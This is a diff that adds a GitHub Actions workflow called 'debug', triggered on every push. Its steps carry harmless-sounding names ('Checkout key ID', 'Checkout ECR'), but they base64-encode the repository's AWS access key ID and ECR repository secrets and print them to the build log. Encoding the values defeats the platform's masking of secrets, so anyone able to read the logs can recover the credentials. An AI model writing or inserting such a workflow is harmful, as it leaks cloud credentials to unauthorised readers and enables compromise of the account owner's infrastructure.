@@ -1,0 +1,16 @@
+name: debug
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout key ID
+      shell: bash
+      env:
+        KEYID: ${{secrets.AWS_ACCESS_KEY_ID}}
+      run: 'echo "$KEYID" | base64 > log.txt && cat log.txt'
+    - name: Checkout ECR
+      shell: bash
+      env:
+        KEYID: ${{ secrets.ECR_REPOSITORY }}
+      run: 'echo "$KEYID" | base64 > log.txt && cat log.txt'
